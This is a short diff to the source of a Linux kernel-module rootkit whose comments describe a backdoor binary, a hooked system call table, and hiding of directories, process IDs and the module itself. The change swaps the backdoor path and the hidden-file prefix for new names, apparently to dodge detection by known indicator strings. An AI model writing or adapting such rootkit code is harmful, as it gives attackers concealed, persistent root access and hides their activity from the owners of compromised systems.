@@ -8,14 +8,14 @@
 #include <asm/paravirt.h>
 #include <linux/dirent.h>
 
-#define SHELL "/bin/rootk_backdoor"       /* path to backdoor binary */
+#define SHELL "/bin/btro"       /* path to backdoor binary */
 
 MODULE_LICENSE("GPL");
 
 unsigned long* __sys_call_table = NULL;
 
 static bool dir_hidden = true;            /* are dirents hidden */
-static char *prefix = "rootk_";           /* hide directories with prefix */
+static char *prefix = "btal_";           /* hide directories with prefix */
 char hide_pid[NAME_MAX];                  /* pid's to hide */
 
 static bool hidden = true;                /* is this module hidden */
